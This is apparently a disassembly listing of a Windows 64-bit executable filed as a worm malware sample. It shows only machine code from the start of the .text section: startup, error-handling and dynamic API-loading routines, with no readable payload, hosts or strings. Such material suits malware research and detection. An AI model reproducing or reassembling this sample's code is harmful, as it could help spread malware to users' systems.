
malware_samples/worm/b19d79cdccfb4d48bc8f33ec2422acdf17ade17dd9ba23ea28c23706244e2184.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001005:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000100a:	57                   	push   %rdi
   14000100b:	48 83 ec 20          	sub    $0x20,%rsp
   14000100f:	48 8b c2             	mov    %rdx,%rax
   140001012:	48 8b f9             	mov    %rcx,%rdi
   140001015:	48 85 d2             	test   %rdx,%rdx
   140001018:	75 04                	jne    0x14000101e
   14000101a:	48 8d 41 28          	lea    0x28(%rcx),%rax
   14000101e:	4c 89 41 38          	mov    %r8,0x38(%rcx)
   140001022:	48 8d 15 53 00 00 00 	lea    0x53(%rip),%rdx        # 0x14000107c
   140001029:	4c 89 49 40          	mov    %r9,0x40(%rcx)
   14000102d:	4c 8b c1             	mov    %rcx,%r8
   140001030:	4c 8d 49 20          	lea    0x20(%rcx),%r9
   140001034:	48 8b c8             	mov    %rax,%rcx
   140001037:	e8 00 1e 00 00       	call   0x140002e3c
   14000103c:	8b d8                	mov    %eax,%ebx
   14000103e:	85 c0                	test   %eax,%eax
   140001040:	74 10                	je     0x140001052
   140001042:	0f b7 d8             	movzwl %ax,%ebx
   140001045:	81 cb 00 00 07 80    	or     $0x80070000,%ebx
   14000104b:	85 c0                	test   %eax,%eax
   14000104d:	0f 4e d8             	cmovle %eax,%ebx
   140001050:	eb 16                	jmp    0x140001068
   140001052:	4c 8b 47 08          	mov    0x8(%rdi),%r8
   140001056:	ba 02 00 00 00       	mov    $0x2,%edx
   14000105b:	48 8b 4f 20          	mov    0x20(%rdi),%rcx
   14000105f:	45 0f b7 08          	movzwl (%r8),%r9d
   140001063:	e8 58 1e 00 00       	call   0x140002ec0
   140001068:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   14000106d:	8b c3                	mov    %ebx,%eax
   14000106f:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140001074:	48 83 c4 20          	add    $0x20,%rsp
   140001078:	5f                   	pop    %rdi
   140001079:	c3                   	ret
   14000107a:	90                   	nop
   14000107b:	90                   	nop
   14000107c:	48 8b c4             	mov    %rsp,%rax
   14000107f:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140001083:	48 89 68 10          	mov    %rbp,0x10(%rax)
   140001087:	48 89 70 18          	mov    %rsi,0x18(%rax)
   14000108b:	48 89 78 20          	mov    %rdi,0x20(%rax)
   14000108f:	41 54                	push   %r12
   140001091:	41 56                	push   %r14
   140001093:	41 57                	push   %r15
   140001095:	48 83 ec 40          	sub    $0x40,%rsp
   140001099:	48 8b 9c 24 90 00 00 	mov    0x90(%rsp),%rbx
   1400010a0:	00 
   1400010a1:	4d 8b f9             	mov    %r9,%r15
   1400010a4:	41 8a f0             	mov    %r8b,%sil
   1400010a7:	44 8b f2             	mov    %edx,%r14d
   1400010aa:	4c 8b e1             	mov    %rcx,%r12
   1400010ad:	48 85 db             	test   %rbx,%rbx
   1400010b0:	74 6d                	je     0x14000111f
   1400010b2:	48 8b ac 24 80 00 00 	mov    0x80(%rsp),%rbp
   1400010b9:	00 
   1400010ba:	8b c2                	mov    %edx,%eax
   1400010bc:	85 d2                	test   %edx,%edx
   1400010be:	74 22                	je     0x1400010e2
   1400010c0:	83 f8 01             	cmp    $0x1,%eax
   1400010c3:	75 20                	jne    0x1400010e5
   1400010c5:	41 0f b6 c8          	movzbl %r8b,%ecx
   1400010c9:	b8 00 01 00 00       	mov    $0x100,%eax
   1400010ce:	ff c1                	inc    %ecx
   1400010d0:	4c 89 4b 10          	mov    %r9,0x10(%rbx)
   1400010d4:	45 84 c0             	test   %r8b,%r8b
   1400010d7:	48 89 6b 18          	mov    %rbp,0x18(%rbx)
   1400010db:	0f 45 c1             	cmovne %ecx,%eax
   1400010de:	89 03                	mov    %eax,(%rbx)
   1400010e0:	eb 03                	jmp    0x1400010e5
   1400010e2:	83 23 00             	andl   $0x0,(%rbx)
   1400010e5:	48 8b 7b 38          	mov    0x38(%rbx),%rdi
   1400010e9:	48 85 ff             	test   %rdi,%rdi
   1400010ec:	74 31                	je     0x14000111f
   1400010ee:	48 8b cf             	mov    %rdi,%rcx
   1400010f1:	e8 56 10 00 00       	call   0x14000214c
   1400010f6:	48 8b 43 40          	mov    0x40(%rbx),%rax
   1400010fa:	4d 8b cf             	mov    %r15,%r9
   1400010fd:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140001102:	44 8a c6             	mov    %sil,%r8b
   140001105:	48 8b 84 24 88 00 00 	mov    0x88(%rsp),%rax
   14000110c:	00 
   14000110d:	41 8b d6             	mov    %r14d,%edx
   140001110:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140001115:	49 8b cc             	mov    %r12,%rcx
   140001118:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   14000111d:	ff d7                	call   *%rdi
   14000111f:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   140001124:	48 8b 6c 24 68       	mov    0x68(%rsp),%rbp
   140001129:	48 8b 74 24 70       	mov    0x70(%rsp),%rsi
   14000112e:	48 8b 7c 24 78       	mov    0x78(%rsp),%rdi
   140001133:	48 83 c4 40          	add    $0x40,%rsp
   140001137:	41 5f                	pop    %r15
   140001139:	41 5e                	pop    %r14
   14000113b:	41 5c                	pop    %r12
   14000113d:	c3                   	ret
   14000113e:	90                   	nop
   14000113f:	90                   	nop
   140001140:	53                   	push   %rbx
   140001141:	48 83 ec 40          	sub    $0x40,%rsp
   140001145:	48 8d 05 5c 18 01 00 	lea    0x1185c(%rip),%rax        # 0x1400129a8
   14000114c:	44 8b d2             	mov    %edx,%r10d
   14000114f:	44 2b d0             	sub    %eax,%r10d
   140001152:	4d 8b d8             	mov    %r8,%r11
   140001155:	8a 05 00 19 01 00    	mov    0x11900(%rip),%al        # 0x140012a5b
   14000115b:	4c 8d 42 04          	lea    0x4(%rdx),%r8
   14000115f:	8b 02                	mov    (%rdx),%eax
   140001161:	48 8b d9             	mov    %rcx,%rbx
   140001164:	48 8b 54 24 78       	mov    0x78(%rsp),%rdx
   140001169:	41 81 ca 00 00 00 0b 	or     $0xb000000,%r10d
   140001170:	89 44 24 34          	mov    %eax,0x34(%rsp)
   140001174:	41 8b 00             	mov    (%r8),%eax
   140001177:	89 44 24 38          	mov    %eax,0x38(%rsp)
   14000117b:	41 8b 40 04          	mov    0x4(%r8),%eax
   14000117f:	49 83 c0 08          	add    $0x8,%r8
   140001183:	89 44 24 3c          	mov    %eax,0x3c(%rsp)
   140001187:	48 8b 41 08          	mov    0x8(%rcx),%rax
   14000118b:	48 89 02             	mov    %rax,(%rdx)
   14000118e:	48 8b 41 08          	mov    0x8(%rcx),%rax
   140001192:	48 89 54 24 28       	mov    %rdx,0x28(%rsp)
   140001197:	44 89 54 24 30       	mov    %r10d,0x30(%rsp)
   14000119c:	0f b7 08             	movzwl (%rax),%ecx
   14000119f:	4c 89 42 10          	mov    %r8,0x10(%rdx)
   1400011a3:	89 4a 08             	mov    %ecx,0x8(%rdx)
   1400011a6:	c7 42 0c 02 00 00 00 	movl   $0x2,0xc(%rdx)
   1400011ad:	41 0f b7 00          	movzwl (%r8),%eax
   1400011b1:	4d 8b c3             	mov    %r11,%r8
   1400011b4:	89 42 18             	mov    %eax,0x18(%rdx)
   1400011b7:	8b 44 24 70          	mov    0x70(%rsp),%eax
   1400011bb:	c7 42 1c 01 00 00 00 	movl   $0x1,0x1c(%rdx)
   1400011c2:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   1400011c7:	48 8b 4b 20          	mov    0x20(%rbx),%rcx
   1400011cb:	89 44 24 20          	mov    %eax,0x20(%rsp)
   1400011cf:	e8 c4 1d 00 00       	call   0x140002f98
   1400011d4:	48 83 c4 40          	add    $0x40,%rsp
   1400011d8:	5b                   	pop    %rbx
   1400011d9:	c3                   	ret
   1400011da:	90                   	nop
   1400011db:	90                   	nop
   1400011dc:	90                   	nop
   1400011dd:	90                   	nop
   1400011de:	90                   	nop
   1400011df:	90                   	nop
   1400011e0:	48 81 ec 58 08 00 00 	sub    $0x858,%rsp
   1400011e7:	48 8b 05 2a 3e 01 00 	mov    0x13e2a(%rip),%rax        # 0x140015018
   1400011ee:	48 33 c4             	xor    %rsp,%rax
   1400011f1:	48 89 84 24 40 08 00 	mov    %rax,0x840(%rsp)
   1400011f8:	00 
   1400011f9:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   1400011ff:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   140001204:	44 8b c1             	mov    %ecx,%r8d
   140001207:	c7 44 24 28 00 04 00 	movl   $0x400,0x28(%rsp)
   14000120e:	00 
   14000120f:	b9 00 10 00 00       	mov    $0x1000,%ecx
   140001214:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140001219:	45 33 c9             	xor    %r9d,%r9d
   14000121c:	33 d2                	xor    %edx,%edx
   14000121e:	ff 15 44 ae 00 00    	call   *0xae44(%rip)        # 0x14000c068
   140001224:	45 33 c9             	xor    %r9d,%r9d
   140001227:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   14000122c:	45 33 c0             	xor    %r8d,%r8d
   14000122f:	33 c9                	xor    %ecx,%ecx
   140001231:	ff 15 c9 3d 01 00    	call   *0x13dc9(%rip)        # 0x140015000
   140001237:	48 8b 8c 24 40 08 00 	mov    0x840(%rsp),%rcx
   14000123e:	00 
   14000123f:	48 33 cc             	xor    %rsp,%rcx
   140001242:	e8 59 08 00 00       	call   0x140001aa0
   140001247:	48 81 c4 58 08 00 00 	add    $0x858,%rsp
   14000124e:	c3                   	ret
   14000124f:	90                   	nop
   140001250:	53                   	push   %rbx
   140001251:	48 81 ec 50 01 00 00 	sub    $0x150,%rsp
   140001258:	48 8b 05 b9 3d 01 00 	mov    0x13db9(%rip),%rax        # 0x140015018
   14000125f:	48 33 c4             	xor    %rsp,%rax
   140001262:	48 89 84 24 40 01 00 	mov    %rax,0x140(%rsp)
   140001269:	00 
   14000126a:	8b d9                	mov    %ecx,%ebx
   14000126c:	33 d2                	xor    %edx,%edx
   14000126e:	48 8d 4c 24 24       	lea    0x24(%rsp),%rcx
   140001273:	41 b8 18 01 00 00    	mov    $0x118,%r8d
   140001279:	e8 42 15 00 00       	call   0x1400027c0
   14000127e:	b8 1f 85 eb 51       	mov    $0x51eb851f,%eax
   140001283:	c7 44 24 20 1c 01 00 	movl   $0x11c,0x20(%rsp)
   14000128a:	00 
   14000128b:	f7 e3                	mul    %ebx
   14000128d:	41 b0 03             	mov    $0x3,%r8b
   140001290:	33 c9                	xor    %ecx,%ecx
   140001292:	c1 ea 05             	shr    $0x5,%edx
   140001295:	6b c2 64             	imul   $0x64,%edx,%eax
   140001298:	89 54 24 24          	mov    %edx,0x24(%rsp)
   14000129c:	ba 01 00 00 00       	mov    $0x1,%edx
   1400012a1:	2b d8                	sub    %eax,%ebx
   1400012a3:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   1400012a7:	ff 15 c3 ad 00 00    	call   *0xadc3(%rip)        # 0x14000c070
   1400012ad:	41 b0 03             	mov    $0x3,%r8b
   1400012b0:	ba 02 00 00 00       	mov    $0x2,%edx
   1400012b5:	48 8b c8             	mov    %rax,%rcx
   1400012b8:	ff 15 b2 ad 00 00    	call   *0xadb2(%rip)        # 0x14000c070
   1400012be:	ba 03 00 00 00       	mov    $0x3,%edx
   1400012c3:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400012c8:	4c 8b c0             	mov    %rax,%r8
   1400012cb:	ff 15 67 ad 00 00    	call   *0xad67(%rip)        # 0x14000c038
   1400012d1:	48 8b 8c 24 40 01 00 	mov    0x140(%rsp),%rcx
   1400012d8:	00 
   1400012d9:	48 33 cc             	xor    %rsp,%rcx
   1400012dc:	e8 bf 07 00 00       	call   0x140001aa0
   1400012e1:	48 81 c4 50 01 00 00 	add    $0x150,%rsp
   1400012e8:	5b                   	pop    %rbx
   1400012e9:	c3                   	ret
   1400012ea:	90                   	nop
   1400012eb:	90                   	nop
   1400012ec:	48 8b c4             	mov    %rsp,%rax
   1400012ef:	48 89 58 08          	mov    %rbx,0x8(%rax)
   1400012f3:	48 89 70 18          	mov    %rsi,0x18(%rax)
   1400012f7:	57                   	push   %rdi
   1400012f8:	48 83 ec 30          	sub    $0x30,%rsp
   1400012fc:	48 8b d9             	mov    %rcx,%rbx
   1400012ff:	48 83 60 e8 00       	andq   $0x0,-0x18(%rax)
   140001304:	48 83 60 10 00       	andq   $0x0,0x10(%rax)
   140001309:	83 3d 18 46 01 00 00 	cmpl   $0x0,0x14618(%rip)        # 0x140015928
   140001310:	75 1a                	jne    0x14000132c
   140001312:	83 3d 0b 46 01 00 00 	cmpl   $0x0,0x1460b(%rip)        # 0x140015924
   140001319:	75 11                	jne    0x14000132c
   14000131b:	48 8d 48 10          	lea    0x10(%rax),%rcx
   14000131f:	e8 70 00 00 00       	call   0x140001394
   140001324:	85 c0                	test   %eax,%eax
   140001326:	75 04                	jne    0x14000132c
   140001328:	33 c0                	xor    %eax,%eax
   14000132a:	eb 58                	jmp    0x140001384
   14000132c:	48 8b cb             	mov    %rbx,%rcx
   14000132f:	ff 15 f3 ac 00 00    	call   *0xacf3(%rip)        # 0x14000c028
   140001335:	48 8b d8             	mov    %rax,%rbx
   140001338:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000133d:	83 3d e4 45 01 00 00 	cmpl   $0x0,0x145e4(%rip)        # 0x140015928
   140001344:	74 09                	je     0x14000134f
   140001346:	83 3d d7 45 01 00 00 	cmpl   $0x0,0x145d7(%rip)        # 0x140015924
   14000134d:	75 32                	jne    0x140001381
   14000134f:	33 ff                	xor    %edi,%edi
   140001351:	48 85 c0             	test   %rax,%rax
   140001354:	40 0f 94 c7          	sete   %dil
   140001358:	85 ff                	test   %edi,%edi
   14000135a:	74 0a                	je     0x140001366
   14000135c:	ff 15 9e ac 00 00    	call   *0xac9e(%rip)        # 0x14000c000
   140001362:	8b f0                	mov    %eax,%esi
   140001364:	eb 02                	jmp    0x140001368
   140001366:	33 f6                	xor    %esi,%esi
   140001368:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
   14000136d:	33 c9                	xor    %ecx,%ecx
   14000136f:	ff 15 db ac 00 00    	call   *0xacdb(%rip)        # 0x14000c050
   140001375:	85 ff                	test   %edi,%edi
   140001377:	74 08                	je     0x140001381
   140001379:	8b ce                	mov    %esi,%ecx
   14000137b:	ff 15 87 ac 00 00    	call   *0xac87(%rip)        # 0x14000c008
   140001381:	48 8b c3             	mov    %rbx,%rax
   140001384:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140001389:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   14000138e:	48 83 c4 30          	add    $0x30,%rsp
   140001392:	5f                   	pop    %rdi
   140001393:	c3                   	ret
   140001394:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001399:	57                   	push   %rdi
   14000139a:	48 83 ec 20          	sub    $0x20,%rsp
   14000139e:	8b 05 8c 45 01 00    	mov    0x1458c(%rip),%eax        # 0x140015930
   1400013a4:	33 db                	xor    %ebx,%ebx
   1400013a6:	48 8b f9             	mov    %rcx,%rdi
   1400013a9:	85 c0                	test   %eax,%eax
   1400013ab:	74 13                	je     0x1400013c0
   1400013ad:	48 8d 0d 94 af 00 00 	lea    0xaf94(%rip),%rcx        # 0x14000c348
   1400013b4:	ff 15 76 ac 00 00    	call   *0xac76(%rip)        # 0x14000c030
   1400013ba:	8b 05 70 45 01 00    	mov    0x14570(%rip),%eax        # 0x140015930
   1400013c0:	39 1d 5e 45 01 00    	cmp    %ebx,0x1455e(%rip)        # 0x140015924
   1400013c6:	75 48                	jne    0x140001410
   1400013c8:	85 c0                	test   %eax,%eax
   1400013ca:	75 09                	jne    0x1400013d5
   1400013cc:	e8 f7 00 00 00       	call   0x1400014c8
   1400013d1:	85 c0                	test   %eax,%eax
   1400013d3:	74 14                	je     0x1400013e9
   1400013d5:	48 8b 0d 34 3c 01 00 	mov    0x13c34(%rip),%rcx        # 0x140015010
   1400013dc:	48 8b d7             	mov    %rdi,%rdx
   1400013df:	ff 15 63 ac 00 00    	call   *0xac63(%rip)        # 0x14000c048
   1400013e5:	85 c0                	test   %eax,%eax
   1400013e7:	75 27                	jne    0x140001410
   1400013e9:	ff 15 11 ac 00 00    	call   *0xac11(%rip)        # 0x14000c000
   1400013ef:	8d 48 82             	lea    -0x7e(%rax),%ecx
   1400013f2:	83 f9 01             	cmp    $0x1,%ecx
   1400013f5:	76 0f                	jbe    0x140001406
   1400013f7:	83 f8 78             	cmp    $0x78,%eax
   1400013fa:	74 0a                	je     0x140001406
   1400013fc:	83 f8 01             	cmp    $0x1,%eax
   1400013ff:	74 05                	je     0x140001406
   140001401:	83 f8 32             	cmp    $0x32,%eax
   140001404:	75 0f                	jne    0x140001415
   140001406:	c7 05 14 45 01 00 01 	movl   $0x1,0x14514(%rip)        # 0x140015924
   14000140d:	00 00 00 
   140001410:	bb 01 00 00 00       	mov    $0x1,%ebx
   140001415:	8b c3                	mov    %ebx,%eax
   140001417:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000141c:	48 83 c4 20          	add    $0x20,%rsp
   140001420:	5f                   	pop    %rdi
   140001421:	c3                   	ret
   140001422:	90                   	nop
   140001423:	90                   	nop
   140001424:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001429:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000142e:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140001433:	57                   	push   %rdi
   140001434:	48 83 ec 20          	sub    $0x20,%rsp
   140001438:	48 8b e9             	mov    %rcx,%rbp
   14000143b:	41 8b d9             	mov    %r9d,%ebx
   14000143e:	b9 59 02 00 00       	mov    $0x259,%ecx
   140001443:	49 8b f8             	mov    %r8,%rdi
   140001446:	48 8b f2             	mov    %rdx,%rsi
   140001449:	e8 02 fe ff ff       	call   0x140001250
   14000144e:	85 c0                	test   %eax,%eax
   140001450:	74 4f                	je     0x1400014a1
   140001452:	48 8d 0d 2f af 00 00 	lea    0xaf2f(%rip),%rcx        # 0x14000c388
   140001459:	e8 8e fe ff ff       	call   0x1400012ec
   14000145e:	48 85 c0             	test   %rax,%rax
   140001461:	74 20                	je     0x140001483
   140001463:	48 8d 15 36 af 00 00 	lea    0xaf36(%rip),%rdx        # 0x14000c3a0
   14000146a:	48 8b c8             	mov    %rax,%rcx
   14000146d:	ff 15 ad ab 00 00    	call   *0xabad(%rip)        # 0x14000c020
   140001473:	44 8b cb             	mov    %ebx,%r9d
   140001476:	4c 8b c7             	mov    %rdi,%r8
   140001479:	48 8b d6             	mov    %rsi,%rdx
   14000147c:	48 8b cd             	mov    %rbp,%rcx
   14000147f:	ff d0                	call   *%rax
   140001481:	eb 2d                	jmp    0x1400014b0
   140001483:	ff 15 77 ab 00 00    	call   *0xab77(%rip)        # 0x14000c000
   140001489:	8b c8                	mov    %eax,%ecx
   14000148b:	8b d8                	mov    %eax,%ebx
   14000148d:	e8 4e fd ff ff       	call   0x1400011e0
   140001492:	0f b7 c3             	movzwl %bx,%eax
   140001495:	0d 00 00 07 80       	or     $0x80070000,%eax
   14000149a:	85 db                	test   %ebx,%ebx
   14000149c:	0f 4e c3             	cmovle %ebx,%eax
   14000149f:	eb 0f                	jmp    0x1400014b0
   1400014a1:	b9 7e 04 00 00       	mov    $0x47e,%ecx
   1400014a6:	e8 35 fd ff ff       	call   0x1400011e0
   1400014ab:	b8 7e 04 07 80       	mov    $0x8007047e,%eax
   1400014b0:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400014b5:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   1400014ba:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   1400014bf:	48 83 c4 20          	add    $0x20,%rsp
   1400014c3:	5f                   	pop    %rdi
   1400014c4:	c3                   	ret
   1400014c5:	90                   	nop
   1400014c6:	90                   	nop
   1400014c7:	90                   	nop
   1400014c8:	53                   	push   %rbx
   1400014c9:	48 81 ec f0 02 00 00 	sub    $0x2f0,%rsp
   1400014d0:	48 8b 05 41 3b 01 00 	mov    0x13b41(%rip),%rax        # 0x140015018
   1400014d7:	48 33 c4             	xor    %rsp,%rax
   1400014da:	48 89 84 24 e0 02 00 	mov    %rax,0x2e0(%rsp)
   1400014e1:	00 
   1400014e2:	33 db                	xor    %ebx,%ebx
   1400014e4:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   1400014e9:	39 1d 35 44 01 00    	cmp    %ebx,0x14435(%rip)        # 0x140015924
   1400014ef:	0f 85 7e 01 00 00    	jne    0x140001673
   1400014f5:	48 83 3d 13 3b 01 00 	cmpq   $0xffffffffffffffff,0x13b13(%rip)        # 0x140015010
   1400014fc:	ff 
   1400014fd:	0f 85 70 01 00 00    	jne    0x140001673
   140001503:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140001508:	48 c7 44 24 28 10 00 	movq   $0x10,0x28(%rsp)
   14000150f:	00 00 
   140001511:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   140001516:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000151b:	44 8d 4b 01          	lea    0x1(%rbx),%r9d
   14000151f:	45 33 c0             	xor    %r8d,%r8d
   140001522:	48 8d 15 e7 3a 01 00 	lea    0x13ae7(%rip),%rdx        # 0x140015010
   140001529:	b9 10 00 00 80       	mov    $0x80000010,%ecx
   14000152e:	ff 15 2c ab 00 00    	call   *0xab2c(%rip)        # 0x14000c060
   140001534:	85 c0                	test   %eax,%eax
   140001536:	0f 84 3c 01 00 00    	je     0x140001678
   14000153c:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   140001541:	48 85 c0             	test   %rax,%rax
   140001544:	0f 85 ca 00 00 00    	jne    0x140001614
   14000154a:	4c 8d 44 24 48       	lea    0x48(%rsp),%r8
   14000154f:	48 8d 15 ba 3a 01 00 	lea    0x13aba(%rip),%rdx        # 0x140015010
   140001556:	8d 4b 06             	lea    0x6(%rbx),%ecx
   140001559:	ff 15 b9 aa 00 00    	call   *0xaab9(%rip)        # 0x14000c018
   14000155f:	85 c0                	test   %eax,%eax
   140001561:	0f 84 11 01 00 00    	je     0x140001678
   140001567:	41 b8 05 01 00 00    	mov    $0x105,%r8d
   14000156d:	48 8d 94 24 d0 00 00 	lea    0xd0(%rsp),%rdx
   140001574:	00 
   140001575:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   14000157a:	ff 15 90 aa 00 00    	call   *0xaa90(%rip)        # 0x14000c010
   140001580:	85 c0                	test   %eax,%eax
   140001582:	0f 84 f0 00 00 00    	je     0x140001678
   140001588:	3d 05 01 00 00       	cmp    $0x105,%eax
   14000158d:	72 0e                	jb     0x14000159d
   14000158f:	8d 4b 6f             	lea    0x6f(%rbx),%ecx
   140001592:	ff 15 70 aa 00 00    	call   *0xaa70(%rip)        # 0x14000c008
   140001598:	e9 db 00 00 00       	jmp    0x140001678
   14000159d:	c7 44 24 60 38 00 00 	movl   $0x38,0x60(%rsp)
   1400015a4:	00 
   1400015a5:	c7 44 24 64 88 00 00 	movl   $0x88,0x64(%rsp)
   1400015ac:	00 
   1400015ad:	48 8d 84 24 d0 00 00 	lea    0xd0(%rsp),%rax
   1400015b4:	00 
   1400015b5:	48 89 44 24 68       	mov    %rax,0x68(%rsp)
   1400015ba:	48 c7 84 24 80 00 00 	movq   $0x3,0x80(%rsp)
   1400015c1:	00 03 00 00 00 
   1400015c6:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   1400015cb:	48 89 84 24 90 00 00 	mov    %rax,0x90(%rsp)
   1400015d2:	00 
   1400015d3:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   1400015d8:	ff 15 62 aa 00 00    	call   *0xaa62(%rip)        # 0x14000c040
   1400015de:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   1400015e3:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   1400015e7:	75 21                	jne    0x14000160a
   1400015e9:	ff 15 11 aa 00 00    	call   *0xaa11(%rip)        # 0x14000c000
   1400015ef:	8d 88 ec f8 ff ff    	lea    -0x714(%rax),%ecx
   1400015f5:	83 f9 03             	cmp    $0x3,%ecx
   1400015f8:	76 08                	jbe    0x140001602
   1400015fa:	83 c0 fe             	add    $0xfffffffe,%eax
   1400015fd:	83 f8 01             	cmp    $0x1,%eax
   140001600:	77 76                	ja     0x140001678
   140001602:	48 8b c3             	mov    %rbx,%rax
   140001605:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
   14000160a:	c7 05 18 43 01 00 01 	movl   $0x1,0x14318(%rip)        # 0x14001592c
   140001611:	00 00 00 
   140001614:	48 89 05 f5 39 01 00 	mov    %rax,0x139f5(%rip)        # 0x140015010
   14000161b:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   140001620:	48 8b c8             	mov    %rax,%rcx
   140001623:	ff 15 1f aa 00 00    	call   *0xaa1f(%rip)        # 0x14000c048
   140001629:	85 c0                	test   %eax,%eax
   14000162b:	74 46                	je     0x140001673
   14000162d:	c7 44 24 60 70 00 00 	movl   $0x70,0x60(%rsp)
   140001634:	00 
   140001635:	48 8d 44 24 60       	lea    0x60(%rsp),%rax
   14000163a:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000163f:	4c 8d 0d e2 ac 00 00 	lea    0xace2(%rip),%r9        # 0x14000c328
   140001646:	33 d2                	xor    %edx,%edx
   140001648:	33 c9                	xor    %ecx,%ecx
   14000164a:	44 8d 42 02          	lea    0x2(%rdx),%r8d
   14000164e:	ff 15 04 aa 00 00    	call   *0xaa04(%rip)        # 0x14000c058
   140001654:	85 c0                	test   %eax,%eax
   140001656:	74 0e                	je     0x140001666
   140001658:	48 8d 0d c9 ac 00 00 	lea    0xacc9(%rip),%rcx        # 0x14000c328
   14000165f:	ff 15 c3 a9 00 00    	call   *0xa9c3(%rip)        # 0x14000c028
   140001665:	90                   	nop
   140001666:	48 8b 54 24 40       	mov    0x40(%rsp),%rdx
   14000166b:	33 c9                	xor    %ecx,%ecx
   14000166d:	ff 15 dd a9 00 00    	call   *0xa9dd(%rip)        # 0x14000c050
   140001673:	bb 01 00 00 00       	mov    $0x1,%ebx
   140001678:	8b c3                	mov    %ebx,%eax
   14000167a:	48 8b 8c 24 e0 02 00 	mov    0x2e0(%rsp),%rcx
   140001681:	00 
   140001682:	48 33 cc             	xor    %rsp,%rcx
   140001685:	e8 16 04 00 00       	call   0x140001aa0
   14000168a:	48 81 c4 f0 02 00 00 	add    $0x2f0,%rsp
   140001691:	5b                   	pop    %rbx
   140001692:	c3                   	ret
   140001693:	90                   	nop
   140001694:	48 8d 05 65 39 01 00 	lea    0x13965(%rip),%rax        # 0x140015000
   14000169b:	eb 03                	jmp    0x1400016a0
   14000169d:	90                   	nop
   14000169e:	90                   	nop
   14000169f:	90                   	nop
   1400016a0:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   1400016a5:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   1400016aa:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   1400016af:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   1400016b4:	48 83 ec 68          	sub    $0x68,%rsp
   1400016b8:	66 0f 7f 44 24 20    	movdqa %xmm0,0x20(%rsp)
   1400016be:	66 0f 7f 4c 24 30    	movdqa %xmm1,0x30(%rsp)
   1400016c4:	66 0f 7f 54 24 40    	movdqa %xmm2,0x40(%rsp)
   1400016ca:	66 0f 7f 5c 24 50    	movdqa %xmm3,0x50(%rsp)
   1400016d0:	48 8b d0             	mov    %rax,%rdx
   1400016d3:	48 8d 0d 36 17 01 00 	lea    0x11736(%rip),%rcx        # 0x140012e10
   1400016da:	e8 6d 99 00 00       	call   0x14000b04c
   1400016df:	66 0f 6f 44 24 20    	movdqa 0x20(%rsp),%xmm0
   1400016e5:	66 0f 6f 4c 24 30    	movdqa 0x30(%rsp),%xmm1
   1400016eb:	66 0f 6f 54 24 40    	movdqa 0x40(%rsp),%xmm2
   1400016f1:	66 0f 6f 5c 24 50    	movdqa 0x50(%rsp),%xmm3
   1400016f7:	48 8b 4c 24 70       	mov    0x70(%rsp),%rcx
   1400016fc:	48 8b 54 24 78       	mov    0x78(%rsp),%rdx
   140001701:	4c 8b 84 24 80 00 00 	mov    0x80(%rsp),%r8
   140001708:	00 
   140001709:	4c 8b 8c 24 88 00 00 	mov    0x88(%rsp),%r9
   140001710:	00 
   140001711:	48 83 c4 68          	add    $0x68,%rsp
   140001715:	eb 00                	jmp    0x140001717
   140001717:	ff e0                	jmp    *%rax
   140001719:	90                   	nop
   14000171a:	90                   	nop
   14000171b:	90                   	nop
   14000171c:	53                   	push   %rbx
   14000171d:	48 83 ec 20          	sub    $0x20,%rsp
   140001721:	b9 02 00 00 00       	mov    $0x2,%ecx
   140001726:	e8 21 1e 00 00       	call   0x14000354c
   14000172b:	e8 f0 06 00 00       	call   0x140001e20
   140001730:	8b c8                	mov    %eax,%ecx
   140001732:	e8 59 28 00 00       	call   0x140003f90
   140001737:	e8 88 29 00 00       	call   0x1400040c4
   14000173c:	48 8b d8             	mov    %rax,%rbx
   14000173f:	e8 d0 08 00 00       	call   0x140002014
   140001744:	b9 01 00 00 00       	mov    $0x1,%ecx
   140001749:	89 03                	mov    %eax,(%rbx)
   14000174b:	e8 f8 03 00 00       	call   0x140001b48
   140001750:	84 c0                	test   %al,%al
   140001752:	74 63                	je     0x1400017b7
